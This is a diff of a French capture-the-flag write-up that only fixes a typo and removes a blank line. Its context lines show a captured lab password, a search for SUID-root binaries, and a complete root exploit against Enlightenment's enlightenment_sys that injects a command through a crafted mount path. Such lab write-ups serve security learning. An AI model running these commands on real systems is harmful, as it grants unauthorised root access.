@@ -34,7 +34,7 @@ Mot de passe de Larissa trouvé : FLAG serverfun2$2023!!
 
 ## Root Flag
 
-Trouver les fichier avec une  SUID Permission 
+Trouver les fichiers avec une  SUID Permission 
 
 ```bash
 find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
@@ -48,7 +48,6 @@ mkdir -p "/dev/../tmp/;/tmp/exploit"
 echo "/bin/bash" > /tmp/exploit
 chmod a+x /tmp/exploit
 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
-
 ```
 
 FLAG 
